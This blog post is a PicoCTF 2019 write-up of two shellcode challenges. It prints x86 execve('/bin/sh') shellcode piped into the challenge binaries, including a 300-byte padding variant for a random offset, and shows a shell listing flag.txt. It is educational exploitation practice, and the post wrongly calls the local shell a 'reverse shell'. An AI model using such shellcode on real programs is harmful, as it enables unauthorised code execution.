---
date: 2019-10-25 23:48:05
layout: post
title:  "shellcode 1*2 - PicoCTF 2019"
subtitle: "Created by: Mrx-Exploit"
description: >- 
  Created by: Mrx-Exploit
tags: 
  - picoCTF 
  - pwn
image: >- 
  /assets/img/binary-exploitation/shellcode/banner.png
optimized_image: >- 
  /assets/img/binary-exploitation/shellcode/banner.png
category: blog
author: Hazem Hesham
paginate: true
---

# handy-shellcode

> Points: 50  
> Difficulty: easy  

This challenge looks easy so let's see what will happen  
After Downloading this challenge program we will use `chmod +x vuln` I think it's Basic knowledge  
Now let's run it  
```
root@kali:~/Desktop/picoctf# ./vuln
Enter your shellcode:
ls
ls
Thanks! Executing now...
Segmentation fault
```
It's Taking what any thing I type it and print it Hmmm  
Let's try to get reverse shellcode from [Shell-Code.org](http://shell-storm.org/shellcode/files/shellcode-606.php)  
So our Payload will be  
```
(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"; cat )| ./vuln  
```
Then you will get reverse shell it's easy to hack :D  

---

# slippery-shellcode

> Points: 200  
> Difficulty: easy  

This challenge looks like first one so let's try the same shellcode and see what will happen  
```
root@kali:~/Desktop/picoctf# (python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"; cat )| ./vuln
Enter your shellcode:
1�Ph//shh/bin����°
                  1�@̀
Thanks! Executing from a random location now...
ls
Segmentation fault
```
Wait it's told me `from a random location` let's read the source code  
`int offset = (rand() % 256) + 1;`  
Hmm Let's see to give it bunsh of `A` in the first  
So our Payload will be  
```
(python -c "print 'A'*300+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"; cat )| ./vuln
```  

Let's see what will happen  

``` 
root@kali:~/Desktop/picoctf# (python -c "print 'A'*300+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"; cat )| ./vuln
Enter your shellcode:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1�Ph//shh/bin����°
  1�@̀
Thanks! Executing from a random location now...

ls
flag.txt  vuln
```
We got our shell again it's looks easy too

